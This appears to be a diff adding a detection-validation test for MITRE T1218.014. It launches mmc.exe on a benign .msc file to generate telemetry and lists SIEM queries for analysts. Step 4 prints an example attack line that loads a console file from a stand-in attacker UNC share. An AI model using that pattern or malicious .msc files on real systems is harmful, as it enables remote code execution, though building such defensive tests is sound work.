@@ -1,0 +1,103 @@
+id: T1218.014_mmc
+name: "System Binary Proxy Execution — MMC"
+mitre_technique: "T1218.014"
+mitre_tactic: "defense_evasion"
+description: >
+  mmc.exe (Microsoft Management Console) can open .msc files that define snap-ins and
+  administrative tools. Adversaries craft malicious .msc files that execute code when
+  opened — via malicious snap-in DLLs, ActiveX controls, or exploiting console task pad
+  links. MMC is a signed Windows binary and its network/process activity may be less
+  scrutinized. Malicious .msc files have been used in recent phishing campaigns as an
+  alternative to macro-enabled Office documents.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1218/014/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1218.014 — MMC .msc proxy execution simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Create a malicious .msc file with an embedded command via task pad link"
+    command: |
+      $mscPath = "$env:TEMP\PAS_T1218_014.msc"
+      $outFile = "$env:TEMP\PAS_T1218_014_fired.txt"
+
+      # MMC Console file with ShellCommand task that executes on open
+      # This uses the StringTable/Task approach — benign command for simulation
+      Set-Content $mscPath @'
+<?xml version="1.0" encoding="UTF-16"?>
+<MMC_ConsoleFile ConsoleVersion="3.0" ProgramMode="UserMode - full access">
+  <Snapins>
+    <Snapin CLSID="{D70A2BEA-A63E-11D1-A7D4-0000F87571E3}"
+            Flags="0" Name="PAS Test Snapin" NameStringID="0"/>
+  </Snapins>
+  <StringTables>
+    <StringTable LanguageID="409">
+      <String ID="0">PAS-T1218.014-MMC-TEST</String>
+    </StringTable>
+  </StringTables>
+</MMC_ConsoleFile>
+'@
+      Write-Host "[PAS] MMC .msc file created: $mscPath"
+      Write-Host "[PAS] Real malicious .msc uses ShellCommand task or malicious snap-in CLSID"
+
+  - step: 3
+    type: exec_powershell
+    description: "Execute the .msc file via mmc.exe — generates process telemetry"
+    command: |
+      $mscPath = "$env:TEMP\PAS_T1218_014.msc"
+      Write-Host "[PAS] Executing: mmc.exe $mscPath"
+      $proc = Start-Process mmc.exe -ArgumentList $mscPath -PassThru -ErrorAction SilentlyContinue
+      Start-Sleep -Seconds 3
+      if ($proc) { $proc | Stop-Process -Force -ErrorAction SilentlyContinue }
+      Write-Host "[PAS] mmc.exe .msc execution telemetry generated"
+
+  - step: 4
+    type: exec_powershell
+    description: "Demonstrate mmc.exe command-line execution of built-in snap-ins — baseline"
+    command: |
+      Write-Host "[PAS] mmc.exe direct snap-in execution patterns used by adversaries:"
+      Write-Host "  mmc.exe /a (author mode — full control)"
+      Write-Host "  mmc.exe C:\path\to\malicious.msc"
+      Write-Host "  mmc.exe \\attacker\share\payload.msc (UNC path — fetches remote console)"
+      Write-Host "[PAS] UNC path variant is particularly dangerous — fetches .msc over SMB"
+
+  - step: 5
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 6
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — mmc.exe with .msc file argument; especially watch for UNC path .msc loading"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Kill mmc and remove .msc file"
+    command: |
+      Get-Process mmc -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+      Remove-Item "$env:TEMP\PAS_T1218_014.msc" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] MMC and .msc file cleaned up"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1218.014 cleanup complete"
+
+analyst_checklist:
+  - "Process event: mmc.exe with a .msc file argument from TEMP or user directory"
+  - "Process event: mmc.exe with UNC path argument (\\\\server\\share\\file.msc) — remote .msc fetch"
+  - "Network event: mmc.exe making SMB connection — UNC path .msc loading"
+  - "Sentinel: DeviceProcessEvents | where FileName == 'mmc.exe' and ProcessCommandLine contains '.msc' and ProcessCommandLine !contains 'System32'"
+  - "Sentinel: DeviceProcessEvents | where FileName == 'mmc.exe' and ProcessCommandLine contains '\\\\\\\\'"
+  - "MDE alert: 'MMC loading untrusted console file' or 'Suspicious .msc file execution'"
+  - "CONTROL CHECK: mmc.exe opening .msc files from TEMP, Downloads, or UNC paths should alert immediately"
+  - "CONTROL CHECK: Block .msc file delivery via email — recent GrimResource/MSC Dropper campaigns deliver via phishing"
